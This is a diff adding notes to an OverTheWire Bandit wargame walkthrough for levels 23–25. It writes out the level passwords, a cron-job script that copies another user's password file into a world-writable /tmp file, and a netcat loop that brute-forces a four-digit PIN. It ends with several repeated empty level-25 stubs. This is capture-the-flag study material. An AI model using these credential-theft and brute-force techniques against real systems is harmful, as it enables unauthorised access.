@@ -133,4 +133,37 @@ bandit22@bandit : ls -la /etc/cron.d/, cat /usr/bin/cronjob_bandit23.sh, echo I 
 
 Bandit Level 23 : Learn how to create an auto script and add it into the correct position, and know how to check permissions with 'ls -l'
 The password for accessing bandit23 is: gKXDTAXnIz3OBxiPjRZ2uqutUlPZrBsw
-bandit23@bandit :
+bandit23@bandit : create file in /tmp and chmod 777 then create file in /foo/ to copies his psw to my file in /tmp because this automation will execute every single file in /foo/ and deleted it when finished -> script that I use is :
+chmod 777 keep.psw (allow everything to everyone)
+touch script.pp
+echo '#!/bin/bash' > script.pp
+echo 'cat /etc/bandit_pass/bandit24 > /tmp/24/keep.psw' >> script.pp
+chmod +x script.pp
+
+Bandit Level 24 : Learn how to and what is brute force
+The password for accessing bandit24 is: hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
+bandit24@bandit : for i in {0000..9999}; do echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $i"; done | nc localhost 30002 | grep -v "Wrong"
+
+Bandit Level 25 : 
+The password for accessing bandit25 is: SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
+bandit25@bandit : 
+
+Bandit Level 25 : 
+The password for accessing bandit25 is: 
+bandit25@bandit : 
+
+Bandit Level 25 : 
+The password for accessing bandit25 is: 
+bandit25@bandit : 
+
+Bandit Level 25 : 
+The password for accessing bandit25 is: 
+bandit25@bandit : 
+
+Bandit Level 25 : 
+The password for accessing bandit25 is: 
+bandit25@bandit : 
+
+Bandit Level 25 : 
+The password for accessing bandit25 is: 
+bandit25@bandit : 
